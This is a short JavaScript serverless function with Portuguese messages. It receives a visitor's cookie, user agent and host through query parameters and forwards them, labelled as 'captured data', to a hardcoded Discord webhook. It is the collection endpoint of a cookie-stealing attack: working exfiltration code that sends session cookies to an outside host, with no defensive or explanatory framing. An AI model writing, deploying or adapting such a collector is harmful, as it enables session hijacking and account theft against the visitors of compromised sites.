export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);
    const cookie = searchParams.get("cookie") || "Não enviado";
    const userAgent = searchParams.get("userAgent") || "Não enviado";
    const host = searchParams.get("host") || "Desconhecido";

    const payload = {
      embeds: [{
        title: "Dados capturados do site",
        color: 0xff0000,
        fields: [
          { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1024)}\`\`\``, inline: false },
          { name: "User Agent", value: `\`\`\`${userAgent.slice(0, 1024)}\`\`\``, inline: false },
          { name: "Host", value: host, inline: true },
          { name: "Timestamp", value: new Date().toISOString(), inline: true },
        ],
      }],
    };

    const resp = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!resp.ok) throw new Error("Falha no envio do webhook");

    return new Response("Enviado com sucesso!", { status: 200 });
  } catch (e) {
    return new Response(`Erro: ${e.message}`, { status: 500 });
  }
}
